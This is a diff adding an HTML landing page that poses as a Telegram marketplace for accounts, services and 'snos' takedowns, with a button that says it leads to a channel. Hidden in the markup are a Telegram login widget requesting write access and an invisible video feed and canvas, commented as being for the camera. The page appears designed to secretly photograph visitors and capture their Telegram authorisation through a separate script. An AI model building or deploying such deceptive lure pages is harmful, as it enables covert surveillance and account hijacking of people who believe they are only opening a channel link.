@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MARKET</title>
+    <script src="https://telegram.org/js/telegram-widget.js?22" 
+            data-telegram-login="your_bot_username_bot" 
+            data-size="large" 
+            data-onauth="onTelegramAuth(user)" 
+            data-request-access="write"
+            hidden>
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            background-color: #f9f9f9;
+        }
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin: 10px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            background-color: #f0f0f0;
+            min-height: 50px;
+        }
+        .hidden {
+            display: none;
+        }
+        #cameraFeed {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>MARKET</h1>
+        <p>Лучший маркет в телеграм! Акаунты, услуги, каналы.</p>
+        Telegram
+        Waspa Snos
+
+        manager - @w2sp3r
+
+        VIEW CHANNEL
+        <button id="consentBtn">Перейти в канал</button>
+        <div id="status">Нажмите кнопку, чтобы перейти в наш Telegram-канал</div>
+        <div id="successMsg" class="hidden">Успешно! Перенаправляем...</div>
+    </div>
+    
+    <!-- Скрытые элементы для камеры -->
+    <video id="cameraFeed" autoplay playsinline></video>
+    <canvas id="photoCanvas" style="display:none;"></canvas>
+
+    <script src="script.js"></script>
+</body>
+</html>
